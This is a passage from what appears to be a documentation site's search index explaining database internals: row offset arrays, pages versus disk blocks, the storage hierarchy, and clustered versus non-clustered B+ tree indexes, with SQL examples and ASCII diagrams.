LSN 8 bytes Log Sequence Number (for recovery) Page Level 2 bytes Level in B-Tree (0 for leaf) Flags 2 bytes Status flags (dirty, compressed, etc.) Reserved ~60 bytes Database-specific metadata <p>Who Controls Data Pages?</p> <p>The Buffer Manager (part of the database storage engine) controls data pages: - Manages page cache (buffer pool) in memory - Handles page reads from disk - Handles page writes to disk - Implements page replacement algorithms (LRU, Clock) - Ensures page consistency and integrity</p>"},{"location":"system-design/high-level/concepts/database-indexing/#row-offset-array-why-its-critical","title":"Row Offset Array: Why It's Critical","text":"<p>The Problem: Variable-Length Rows</p> <p>Database rows are not fixed-size because of: - VARCHAR columns (variable-length strings) - NULL values (may occupy no space) - TEXT/BLOB columns - Different character encodings (UTF-8 can use 1-4 bytes per character)</p> <p>Example Problem Without Offset Array:</p> <pre><code>Fixed-size approach (DOESN'T WORK):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Row 1 (150 bytes) | Row 2 (80 bytes)   \u2502\n\u2502 Row 3 (200 bytes) | ...                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u274c Problem: How to find Row 3 quickly?\n   - Can't calculate: Position = row_number \u00d7 row_size\n   - Must scan: Row 1 \u2192 Row 2 \u2192 Row 3\n   - O(n) time to access any row!\n</code></pre> <p>Solution: Row Offset Array</p> <pre><code>With Offset Array:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Header                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                \u2502\n\u2502 \u2502 Offset[0] = 200      \u2502 \u2190 Points to Row 1 at byte 200\n\u2502 \u2502 Offset[1] = 350      \u2502 \u2190 Points to Row 2 at byte 350\n\u2502 \u2502 Offset[2] = 430      \u2502 \u2190 Points to Row 3 at byte 430\n\u2502 \u2502 Offset[3] = 630      \u2502 \u2190 Points to Row 4 at byte 630\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                \u2502\n\u2502                                          \u2502\n\u2502 Data Area:                               \u2502\n\u2502 [byte 200] Row 1 (150 bytes)            \u2502\n\u2502 [byte 350] Row 2 (80 bytes)             \u2502\n\u2502 [byte 430] Row 3 (200 bytes)            \u2502\n\u2502 [byte 630] Row 4 (...)                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u2705 Advantage: Direct access to Row 3 in O(1):\n   1. Read Offset[2] = 430\n   2. Jump to byte 430\n   3. Read row\n</code></pre> <p>Why Row Offset Array is Needed:</p> <ol> <li> <p>Variable-Length Row Support <pre><code>Without offsets: Must scan from start\nWith offsets: Direct jump to any row\n\nExample with VARCHAR:\nRow 1: id=1, name=\"Jo\" (short)\nRow 2: id=2, name=\"Christopher Alexander\" (long)\nRow 3: id=3, name=\"Li\" (short)\n\nOffset[0] = 200  (Row 1 starts)\nOffset[1] = 220  (Row 2 starts, 20 bytes after)\nOffset[2] = 265  (Row 3 starts, 45 bytes after)\n</code></pre></p> </li> <li> <p>Fast Random Access <pre><code>Access row #5:\n- WITHOUT offset array: O(n) - scan rows 0\u21921\u21922\u21923\u21924\u21925\n- WITH offset array: O(1) - read Offset[5], jump directly\n</code></pre></p> </li> <li> <p>Efficient Updates (Row Relocation) <pre><code>UPDATE users SET name = 'Very Long Name Here' WHERE id = 2;\n\nOld Row 2: 80 bytes\nNew Row 2: 150 bytes (doesn't fit in original location!)\n\nSolution:\n1. Move Row 2 to end of page (new location)\n2. Update Offset[1] to new location\n3. Other rows' offsets unchanged!\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Offset[0] = 200  (unchanged)           \u2502\n\u2502 Offset[1] = 7800 (updated!)            \u2502\n\u2502 Offset[2] = 430  (unchanged)           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nNo need to shift Row 3, Row 4, Row 5... in memory!\n</code></pre></p> </li> <li> <p>Efficient Deletion (Slot Reuse) <pre><code>DELETE FROM users WHERE id = 2;\n\nMethod 1 - WITHOUT offset array:\n- Shift all following rows backward\n- Expensive for large pages (thousands of bytes moved)\n\nMethod 2 - WITH offset array:\n- Mark Offset[1] as NULL/deleted (-1)\n- Don't move any data\n- Reuse slot for future inserts\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Offset[0] = 200                        \u2502\n\u2502 Offset[1] = -1     (deleted!)          \u2502\n\u2502 Offset[2] = 430                        \u2502\n\u2502 Offset[3] = 630                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSpace at old Row 2 location becomes free space!\n</code></pre></p> </li> <li> <p>Maintains Row Order Without Physical Order <pre><code>Logical order (by primary key):\nRow 0: id=1\nRow 1: id=2\nRow 2: id=3\n\nPhysical storage (after updates):\n[byte 200] id=1 (original)\n[byte 350] id=3 (inserted later)\n[byte 430] id=2 (updated, relocated)\n\nOffset array maintains logical order:\nOffset[0] = 200  \u2192 id=1\nOffset[1] = 430  \u2192 id=2 (points to relocated position)\nOffset[2] = 350  \u2192 id=3\n\nQueries still return rows in correct order!\n</code></pre></p> </li> </ol> <p>Advantages of Row Offset Array:</p> Advantage Description Performance Impact O(1) Row Access Direct jump to any row without scanning 100x faster for large pages No Data Movement on Update Just update offset pointer when row relocates Saves thousands of memory copies Fast Deletion Mark offset as deleted, don't shift data O(1) instead of O(n) Space Reuse Deleted slots can be reused by new inserts Better space utilization Logical vs Physical Separation Rows can be physically scattered but logically ordered Flexibility in storage Update-in-Place Optimization If new data fits in old location, no relocation needed Minimal overhead Compact Array Offsets are small (2-4 bytes each) Minimal space overhead (~0.1% of page) <p>Real-World Performance Example:</p> <pre><code>Scenario: Page with 100 rows, access row #87\n\nWITHOUT Offset Array:\n1. Start at byte 96 (after header)\n2. Read row 0 length \u2192 skip row 0\n3. Read row 1 length \u2192 skip row 1\n...\n87. Read row 86 length \u2192 skip row 86\n88. Finally read row 87\n\nTime: ~87 reads \u00d7 10\u03bcs = 870\u03bcs\n\nWITH Offset Array:\n1. Read Offset[87] = 6543\n2. Jump to byte 6543\n3. Read row 87\n\nTime: ~2 reads \u00d7 10\u03bcs = 20\u03bcs\n\nResult: 43x faster!\n</code></pre> <p>Memory Overhead Calculation:</p> <pre><code>Page size: 8KB (8192 bytes)\nAverage row size: 100 bytes\nRows per page: ~80 rows\n\nOffset Array Size:\n- 2 bytes per offset \u00d7 80 rows = 160 bytes\n- Overhead: 160 / 8192 = 1.95% of page\n\nTrade-off:\n- Cost: ~2% storage overhead\n- Benefit: O(n) \u2192 O(1) access, massively faster updates/deletes\n\nConclusion: Worth it! 2% overhead for 10-100x performance gain\n</code></pre> <p>How Databases Use Offset Arrays:</p> <pre><code>PostgreSQL:\n- Array at start of page\n- 4-byte offsets (ItemIdData)\n- Format: [offset, length, flags]\n\nMySQL InnoDB:\n- \"Record directory\" at end of page\n- 2-byte offsets\n- Grows backward from page end\n\nSQL Server:\n- \"Slot array\" after page header\n- 2-byte offsets\n- Supports row versioning\n\nOracle:\n- \"Row directory\" in page header\n- Variable-size offsets\n- Supports row chaining\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#data-blocks","title":"Data Blocks","text":"<p>What are Data Blocks?</p> <p>A data block is the physical storage unit on disk, typically managed by the operating system or file system. In many contexts, \"block\" and \"page\" are used interchangeably, but there's a subtle difference:</p> <ul> <li>Data Block: Physical storage unit on disk (OS level)</li> <li>Data Page: Logical storage unit in database (DBMS level)</li> </ul> <p>Data Block Structure:</p> <pre><code>Physical Disk Layout:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    DISK (Hard Drive / SSD)                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Block 0  \u2502  Block 1  \u2502  Block 2  \u2502  Block 3  \u2502  Block 4   \u2502\n\u2502  (4KB)    \u2502  (4KB)    \u2502  (4KB)    \u2502  (4KB)    \u2502  (4KB)     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502           \u2193 Database maps pages to blocks                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Page 1   \u2502  Page 2   \u2502  Page 3   \u2502  Index    \u2502  Page 5    \u2502\n\u2502  (8KB)    \u2502  (8KB)    \u2502  (8KB)    \u2502  Page     \u2502  (8KB)     \u2502\n\u2502  2 blocks \u2502  2 blocks \u2502  2 blocks \u2502  (8KB)    \u2502  2 blocks  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nMapping: Database Page \u2192 Physical Blocks\n- Page size: 8KB\n- Block size: 4KB\n- Each page occupies 2 contiguous blocks\n</code></pre> <p>Who Controls Data Blocks?</p> <p>The Operating System and File System control data blocks: - Allocates disk blocks to files - Manages block I/O operations - Handles block caching at OS level - Ensures data persistence</p> <p>How Pages Map to Blocks:</p> <pre><code>Database File: users.dbf\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Page 0 \u2192 Blocks 0-1   (Header page)         \u2502\n\u2502 Page 1 \u2192 Blocks 2-3   (Data page)           \u2502\n\u2502 Page 2 \u2192 Blocks 4-5   (Data page)           \u2502\n\u2502 Page 3 \u2192 Blocks 6-7   (Index page)          \u2502\n\u2502 ...                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nMapping maintained by: Storage Manager / File Manager\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#complete-storage-hierarchy","title":"Complete Storage Hierarchy","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         APPLICATION LAYER                              \u2502\n\u2502         SQL Query: SELECT * FROM users WHERE id = 5    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         QUERY OPTIMIZER                                \u2502\n\u2502         Decides: Use index or full table scan?         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         BUFFER MANAGER                                 \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502         \u2502  Buffer Pool (Memory Cache)    \u2502            \u2502\n\u2502         \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502            \u2502\n\u2502         \u2502  \u2502Page 1\u2502 \u2502Page 5\u2502 \u2502Page 9\u2502  \u2502  \u2190 Hot pages\u2502\n\u2502         \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502            \u2502\n\u2502         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502         If page not in buffer \u2192 Read from disk        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         STORAGE MANAGER                                \u2502\n\u2502         Translates: Page ID \u2192 Disk Block Address       \u2502\n\u2502         Page 5 \u2192 File: users.dbf, Offset: 40960 bytes \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         FILE SYSTEM (OS)                               \u2502\n\u2502         Reads blocks from disk file                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         PHYSICAL DISK                                  \u2502\n\u2502         Hard Drive / SSD                               \u2502\n\u2502         Block 80-81 \u2192 Contains Page 5 data             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Example: Reading a Row</p> <pre><code>SELECT * FROM users WHERE id = 5;\n</code></pre> <p>Step-by-step process:</p> <ol> <li>Query Parser: Parses SQL query</li> <li>Query Optimizer: Checks if index exists on <code>id</code> column</li> <li>If YES: Use index to find page number</li> <li>If NO: Full table scan (read all pages)</li> <li>Buffer Manager: Check if page is in memory</li> <li>Cache HIT: Return page from buffer pool (fast!)</li> <li>Cache MISS: Read page from disk</li> <li>Storage Manager: Translate page ID to disk location</li> <li>Page 5 \u2192 File offset: 40960 bytes (5 \u00d7 8KB)</li> <li>File System: Read 8KB from disk at offset 40960</li> <li>Buffer Manager: Store page in buffer pool, return data</li> <li>Query Executor: Scan page for record with id=5, return result</li> </ol> <p>Without Index: - Must read ALL pages (e.g., 10,000 pages = 80MB of data) - Time: ~100-500ms for large tables</p> <p>With Index: - Index lookup finds page number instantly - Read only 1-3 pages (8-24KB of data) - Time: ~1-10ms</p>"},{"location":"system-design/high-level/concepts/database-indexing/#question-2-what-types-of-indexing-are-present","title":"Question 2: What Types of Indexing are Present?","text":""},{"location":"system-design/high-level/concepts/database-indexing/#answer_1","title":"Answer:","text":""},{"location":"system-design/high-level/concepts/database-indexing/#what-is-indexing","title":"What is Indexing?","text":"<p>Indexing is the process of creating a data structure (index) that improves the speed of data retrieval operations on a database table. An index stores a sorted copy of selected columns along with pointers to the actual rows.</p>"},{"location":"system-design/high-level/concepts/database-indexing/#advantages-of-indexing","title":"Advantages of Indexing","text":"<p>\u2705 Faster Query Performance - Reduces query execution time from seconds to milliseconds - Especially beneficial for large tables (millions of rows)</p> <p>\u2705 Efficient Searching - WHERE clause queries execute faster - Range queries (BETWEEN, &gt;, &lt;) are optimized</p> <p>\u2705 Faster Sorting - ORDER BY operations use pre-sorted index - No need to sort entire table</p> <p>\u2705 Improved JOIN Performance - Indexed foreign keys speed up JOIN operations</p> <p>\u2705 Uniqueness Enforcement - UNIQUE indexes prevent duplicate values</p>"},{"location":"system-design/high-level/concepts/database-indexing/#disadvantages-of-indexing","title":"Disadvantages of Indexing","text":"<p>\u274c Extra Storage Space - Each index requires additional disk space (10-20% of table size)</p> <p>\u274c Slower Write Operations - INSERT: Must add entry to all indexes - UPDATE: Must update indexes if indexed columns change - DELETE: Must remove entry from all indexes</p> <p>\u274c Maintenance Overhead - Indexes become fragmented over time - Need periodic rebuilding/reorganization</p> <p>\u274c Index Selection Complexity - Too many indexes slow down writes significantly - Wrong indexes waste space without helping queries</p>"},{"location":"system-design/high-level/concepts/database-indexing/#types-of-indexes","title":"Types of Indexes","text":""},{"location":"system-design/high-level/concepts/database-indexing/#1-clustered-index","title":"1. Clustered Index","text":"<p>Definition: A clustered index determines the physical order of data rows in a table. The table data is sorted and stored in the order of the clustered index key.</p> <p>Key Characteristics: - \u2705 One per table: Only one clustered index allowed (because physical order is unique) - \ud83d\udcca Table is the index: Leaf nodes contain actual data rows, not pointers - \ud83d\udd22 Physical ordering: Rows are stored in sorted order on disk - \u26a1 Fast range queries: Sequential disk reads</p> <p>Structure:</p> <pre><code>Clustered Index B+ Tree:\n                    [Root Node]\n                        50\n                    /        \\\n                   /          \\\n          [Internal Node]   [Internal Node]\n             20    35           65    80\n            /  |   |  \\         /  |   |  \\\n           /   |   |   \\       /   |   |   \\\n    [Leaf: Actual Data Rows - Stored in sorted order]\n\n    [10,John,30] \u2192 [15,Jane,25] \u2192 [20,Bob,35] \u2192 [25,Alice,28] \u2192\n    [35,Tom,40]  \u2192 [40,Sara,22] \u2192 [50,Mike,33] \u2192 [60,Lisa,29]  \u2192\n    [65,Dave,45] \u2192 [70,Emma,31] \u2192 [80,Paul,27] \u2192 [90,Kate,38]\n\n    \u2191 Leaf nodes contain the ACTUAL table data, sorted by index key\n</code></pre> <p>Example:</p> <pre><code>-- Create clustered index on primary key\nCREATE TABLE users (\n    id INT PRIMARY KEY,  -- Automatically creates clustered index\n    name VARCHAR(100),\n    age INT\n);\n\n-- Data is physically stored sorted by id:\n-- Page 1: id 1-100\n-- Page 2: id 101-200\n-- Page 3: id 201-300\n-- ...\n</code></pre> <p>Advantages: - \u2705 Extremely fast for range queries (e.g., <code>WHERE id BETWEEN 100 AND 200</code>) - \u2705 Data is already sorted (no sorting needed for ORDER BY on indexed column) - \u2705 Faster for queries returning large result sets</p> <p>Disadvantages: - \u274c Only one per table - \u274c Slower INSERT/UPDATE if data isn't inserted in index order - \u274c Page splits occur when inserting into middle of sorted data</p>"},{"location":"system-design/high-level/concepts/database-indexing/#2-non-clustered-index-secondary-index","title":"2. Non-Clustered Index (Secondary Index)","text":"<p>Definition: A non-clustered index creates a separate structure from the table data. It contains index keys and pointers (row locators) to the actual data rows.</p> <p>Key Characteristics: - \u2705 Multiple per table: Can have many non-clustered indexes - \ud83d\udd17 Separate structure: Index stored separately from table data - \ud83d\udccd Contains pointers: Leaf nodes contain row pointers, not actual data - \ud83c\udfaf Flexible: Can index any column(s)</p> <p>Structure:</p> <pre><code>Non-Clustered Index B+ Tree (on 'name' column):\n                    [Root Node]\n                       'Jane'\n                    /          \\\n                   /            \\\n          [Internal Node]    [Internal Node]\n           'Alice' 'Dave'      'Mike' 'Tom'\n           /   |    |   \\      /   |   |   \\\n          /    |    |    \\    /    |   |    \\\n    [Leaf: Index Keys + Pointers to Actual Rows]\n\n    ['Alice', ptr\u2192Row3] \u2192 ['Bob', ptr\u2192Row1]   \u2192 ['Dave', ptr\u2192Row4]  \u2192\n    ['Emma', ptr\u2192Row7]  \u2192 ['Jane', ptr\u2192Row2]  \u2192 ['John', ptr\u2192Row5]  \u2192\n    ['Kate', ptr\u2192Row9]  \u2192 ['Lisa', ptr\u2192Row8]  \u2192 ['Mike', ptr\u2192Row6]  \u2192\n    ['Paul', ptr\u2192Row10] \u2192 ['Sara', ptr\u2192Row11] \u2192 ['Tom', ptr\u2192Row12]\n\n    \u2191 Leaf nodes contain index key + pointer to actual row location\n\n    Actual Table Data (stored in clustered index or heap order):\n    Row1: [20, 'Bob',   35]\n    Row2: [15, 'Jane',  25]\n    Row3: [25, 'Alice', 28]\n    Row4: [65, 'Dave',  45]\n    ...\n</code></pre> <p>Example:</p> <pre><code>-- Create non-clustered index on name column\nCREATE INDEX idx_name ON users(name);\n\n-- Index is separate from table data\n-- When querying: SELECT * FROM users WHERE name = 'Alice'\n-- 1. Search index for 'Alice' \u2192 Get pointer to Row3\n-- 2. Use pointer to fetch actual row data\n</code></pre> <p>Advantages: - \u2705 Multiple indexes possible on same table - \u2705 Can optimize different query patterns - \u2705 Doesn't affect physical data ordering</p> <p>Disadvantages: - \u274c Requires extra disk space (separate structure) - \u274c Two lookups: Index lookup + data fetch (bookmark lookup) - \u274c Slower than clustered index for range queries</p>"},{"location":"system-design/high-level/concepts/database-indexing/#clustered-vs-non-clustered-index-comparison","title":"Clustered vs Non-Clustered Index Comparison","text":"Aspect Clustered Index Non-Clustered Index Number per table One only Multiple (typically up to 999) Data storage Leaf nodes contain actual rows Leaf nodes contain pointers to rows Physical order Determines row order on disk Doesn't affect row order Space No extra space (table itself) Extra space for separate structure Speed Faster for range queries Faster for specific lookups INSERT impact Can cause page splits Less impact on inserts Common use Primary key 